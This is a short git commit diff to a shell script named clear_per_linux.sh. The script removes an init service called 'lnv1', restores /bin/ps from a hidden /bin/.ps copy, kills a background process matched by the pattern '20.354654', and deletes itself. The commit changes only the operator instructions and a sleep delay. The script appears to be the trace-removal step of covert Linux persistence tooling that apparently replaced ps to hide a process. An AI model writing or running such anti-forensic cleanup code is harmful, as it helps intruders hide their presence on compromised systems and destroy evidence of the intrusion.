f0eff9c979bb30849e8b75895ba630ea9f53aeef
d3n50 <55601803+d3n50@users.noreply.github.com>
2019-11-14 20:57:59 +0000

    Update clear_per_linux.sh

--- clear_per_linux.sh
+++ clear_per_linux.sh
@@ -2,8 +2,8 @@
 
 vv=$3
 if [ -v vv ];then
-	echo 'Usage: ./clear_per_linux.sh & disown -h $!;exit'
-	echo
+	echo 'Usage: ./clear_per_linux.sh & disown -h $!'
+	echo 'After execute this command, you must close the conection before 20 seconds'
 	exit
 fi
 update-rc.d lnv1 remove
@@ -13,6 +13,6 @@ if [ -f /bin/.ps ];then
 	mv /bin/.ps /bin/ps
 fi
 echo "Please, write \"exit\" and press Enter to kill the process in background from this computer, you have 20 seconds..."
-sleep 10
+sleep 20
 kill $(ps -o ppid= -p $(ps -aux | grep '20\.354654' | awk '{print $2}'))
 rm `pwd`/clear_per_linux.sh
